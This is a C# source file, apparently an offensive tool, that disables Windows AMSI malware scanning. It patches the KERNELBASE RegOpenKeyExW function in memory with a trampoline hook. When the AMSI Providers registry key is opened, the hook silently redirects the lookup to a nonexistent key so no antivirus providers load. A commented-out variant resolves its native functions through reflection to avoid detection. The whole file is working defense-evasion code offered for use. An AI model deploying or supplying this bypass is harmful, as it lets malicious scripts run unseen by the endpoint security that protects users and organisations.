using System;
using System.Linq;
using System.Runtime.InteropServices;

public static class TrollDisappearKeyPS
{

    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    static public int oldProtect;
    static public IntPtr targetAddr, hookAddr;
    static public byte[] originalBytes = new byte[12];
    static public byte[] hookBytes = new byte[12];
    static public int counter;
    static public delegateRegOpenKeyExW A;


    public static void DisappearKey()
    {
        A = RegOpenKeyWDetour;
        targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
        hookAddr = Marshal.GetFunctionPointerForDelegate(A);
        Marshal.Copy(targetAddr, originalBytes, 0, 12);
        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);

    }

    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {
        try
        {
            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);

            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
            {
                counter = counter + 1; 
                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
            }
            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);

        }
        finally
        {
            if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
            
        }
    }
}


/*
// Same code just tweaked a bit 

using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Reflection;

public static class TrollDisappearKeyPS
{

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate bool delegateVirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    static public int oldProtect;
    static public IntPtr targetAddr, hookAddr;
    static public byte[] originalBytes = new byte[12];
    static public byte[] hookBytes = new byte[12];
    static public int counter;


    public static IntPtr GetProcAddress(string moduleName, string procedureName)
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        Assembly systemAssembly = assemblies.FirstOrDefault(a =>
            a.GlobalAssemblyCache &&
            a.Location.EndsWith("System.dll", StringComparison.OrdinalIgnoreCase));
        Type unsafeNativeMethods = systemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
        MethodInfo getModuleHandle = unsafeNativeMethods.GetMethod("GetModuleHandle", new Type[] { typeof(string) });
        MethodInfo getProcAddress = unsafeNativeMethods.GetMethod("GetProcAddress", new Type[] { typeof(HandleRef), typeof(string) });
        object hModule = getModuleHandle.Invoke(null, new object[] { moduleName });
        IntPtr dummyPtr = IntPtr.Zero;
        HandleRef handleRef = new HandleRef(dummyPtr, (IntPtr)hModule);
        object procAddress = getProcAddress.Invoke(null, new object[] { handleRef, procedureName });
        return (IntPtr)procAddress;
    }

    public static void DisappearKey()
    {
        delegateRegOpenKeyExW A = RegOpenKeyWDetour;
        hookAddr = Marshal.GetFunctionPointerForDelegate(A);

        targetAddr = GetProcAddress("KERNELBASE.dll", "RegOpenKeyExW");
        Marshal.Copy(targetAddr, originalBytes, 0, 12);

        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();

        IntPtr VPAddr = GetProcAddress("kernel32.dll", "VirtualProtect");
        var VirtualProtect = (delegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(VPAddr, typeof(delegateVirtualProtect));
        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);

    }

    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {

        var RegOpenKeyExW = (delegateRegOpenKeyExW)Marshal.GetDelegateForFunctionPointer(targetAddr, typeof(delegateRegOpenKeyExW));

        try
        {
            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);

            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
            {
                counter = counter + 1;
                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
            }
            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);

        }
        finally
        {
            if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }

        }
    }
}

*/
